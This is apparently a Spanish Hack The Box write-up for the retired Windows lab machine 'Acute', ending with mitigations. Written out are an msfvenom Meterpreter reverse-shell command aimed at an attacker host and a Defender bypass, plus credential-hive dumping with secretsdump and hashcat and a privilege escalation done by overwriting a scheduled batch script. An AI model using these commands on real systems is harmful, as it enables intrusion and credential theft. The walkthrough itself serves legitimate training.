---
machine: Acute
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, powershell-web-access, meterpreter, defender-bypass, lateral-movement, hive-dump, privesc]
---

# Acute — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El único servicio expuesto es HTTPS en `443`, un sitio ASP.NET de una empresa ficticia. La página publica `New_Starter_CheckList_v7.docx`, cuyas propiedades dan el formato de usuario y una contraseña por defecto. Con esa convención se entra en PowerShell Web Access (PSWA) como `edavies` en `Acute-PC01`. Un payload de Meterpreter obliga a saltar Defender antes de obtener ejecución. A partir de ahí la máquina es un encadenado de credenciales y endpoints restringidos de PowerShell: `Invoke-Command` hacia `ATSSERVER` como `imonks`, un script modificable que da acceso como `jmorgan`, y el volcado de hives de `awallace` para crackear su hash y reutilizar la contraseña. `keepmeon.bat`, que Lois ejecuta cada cinco minutos, permite añadir a `awallace` al grupo `Site_Admin`.

## Reconocimiento

```bash
nmap -Pn -sCV -p443 <IP>
```

- `443` Microsoft HTTPAPI httpd 2.0, sitio ASP.NET.
- El certificado y el contenido apuntan a una intranet corporativa; no hay HTTP en claro.
- La web lista al personal: `awallace`, `chall`, `edavies`, `imonks`, `jmorgan` y `lhopkins`.

```bash
feroxbuster -u https://<IP> -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Entre las rutas aparece el acceso a PSWA (`/pswa`) y la zona de descargas con el documento de bienvenida.

## Enumeración

```bash
wget --no-check-certificate https://<IP>/New_Starter_CheckList_v7.docx
unzip -o New_Starter_CheckList_v7.docx -d docx
cat docx/docProps/core.xml
grep -ri "password\|user\|account" docx/word/
```

Las propiedades del DOCX identifican al autor y el formato de nombre de usuario (`inicial` + apellido), y el contenido incluye una contraseña inicial que la empresa no ha rotado. Con la lista de la web se generan los candidatos y se prueban en PSWA.

El formulario de PSWA pide usuario, contraseña y nombre de equipo. `Acute-PC01` acepta las credenciales de `edavies`; `ATSSERVER` es el otro host de la red.

## Foothold

La sesión de PSWA es una consola PowerShell limitada, suficiente para ejecutar comandos y descargar archivos. Para trabajar cómodo se genera un payload de Meterpreter:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 -f exe -o update.exe
```

La primera carga la bloquea Defender. Tras identificar la firma y ofuscar el binario (cifrado y ejecución en memoria), el payload se sube y se ejecuta, y la sesión de Meterpreter permite migrar a un proceso estable y abrir PowerShell.

## Movimiento lateral

El primer salto usa los endpoints restringidos de PowerShell. Desde la sesión de `edavies` se enumera qué configuración acepta `ATSSERVER` y con qué credenciales:

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName <ENDPOINT> -ScriptBlock { whoami; hostname } -Credential $cred
```

Con las credenciales de `imonks` se obtiene ejecución en `ATSSERVER`. Allí se comprueba que es un contenedor o VM, se ejecuta WinPEAS y se revisa `screenshare`, que expone la pantalla del usuario y permite observar sus credenciales.

El siguiente usuario es `jmorgan` en `Acute-PC01`. Su shell es limitada, pero puede leer `Program Files` y su escritorio; un script que ejecuta de forma periódica se puede modificar para lanzar comandos en su contexto.

El último salto es `awallace` en `ATSSERVER`. Con su contexto se guardan los hives del registro y se extraen los hashes:

```powershell
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
hashcat -m 1000 <HASH> /usr/share/wordlists/rockyou.txt
```

La contraseña crackeada se reutiliza y da acceso como `awallace`.

## Escalada de privilegios

`awallace` puede leer `C:\program files\keepmeon`. Dentro hay `keepmeon.bat`, un script que Lois ejecuta cada cinco minutos en `ATSSERVER`. El directorio permite escribir, así que se reemplaza el contenido por una instrucción que añade al usuario al grupo de administración del sitio:

```powershell
Set-Content -Path 'C:\program files\keepmeon\keepmeon.bat' -Value 'net group site_admin awallace /add /domain'
```

Al ejecutarse el script, `awallace` entra en `Site_Admin`. Esa pertenencia da acceso al panel de administración y al host con privilegios elevados, que es el objetivo final de la máquina.

## Evidencia

- Documento `New_Starter_CheckList_v7.docx` con metadatos y contraseña inicial.
- Inicio de sesión correcto en `/pswa` como `edavies` en `Acute-PC01`.
- Payload de Meterpreter bloqueado por Defender y ejecutado tras el bypass.
- Ejecución en `ATSSERVER` como `imonks` mediante `Invoke-Command`.
- Hives SAM/SYSTEM/SECURITY y hash de `awallace` crackeado.
- `keepmeon.bat` modificado y pertenencia a `Site_Admin`.

## Lecciones aprendidas

- Los metadatos de un documento público pueden filtrar el formato de usuario y credenciales por defecto.
- PSWA es una puerta de entrada completa aunque no haya RDP ni SMB expuestos.
- Defender no impide la ejecución, solo obliga a ofuscar el payload.
- Los endpoints restringidos de PowerShell permiten saltar entre hosts sin un exploit.
- Un directorio escribible que ejecuta un script privilegiado es una escalada directa.

## Mitigaciones y detección

- Retirar de la web documentos con metadatos internos y contraseñas iniciales; rotarlas al crear la cuenta.
- Restringir PSWA por red y exigir MFA; limitar los endpoints de `Invoke-Command` a lo imprescindible.
- Revisar las exclusiones de Defender y alertar de procesos que cargan payloads en memoria.
- Retirar permisos de escritura sobre directorios con scripts ejecutados por otros usuarios.
- Auditar cambios en grupos privilegiados y la creación de procesos hijos de `keepmeon.bat`.

## Referencias

- [0xdf — Acute](https://0xdf.gitlab.io/2022/07/16/htb-acute.html)
- [IppSec — Acute](https://www.youtube.com/watch?v=jDYte7xNY1g)
- [Hack The Box — Acute](https://app.hackthebox.com/machines/acute)
